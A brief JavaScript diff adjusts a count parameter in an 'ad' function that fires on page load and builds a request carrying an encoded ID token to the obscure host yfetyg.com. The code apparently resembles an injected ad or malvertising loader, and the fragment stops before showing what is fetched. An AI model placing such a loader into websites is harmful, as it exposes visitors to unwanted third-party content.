@@ -1,6 +1,6 @@
 window.onload = () => {
 
-    async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTExNDAxMiwid2lkIjoyNjQ0MjEsImQiOiIiLCJsaSI6Mn0", percent=1, count=13) {
+    async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTExNDAxMiwid2lkIjoyNjQ0MjEsImQiOiIiLCJsaSI6Mn0", percent=1, count=12) {
         try {
             const url = `https://yfetyg.com/wnload?a=1&e=${text}=&tz=8&if=0 `;
 
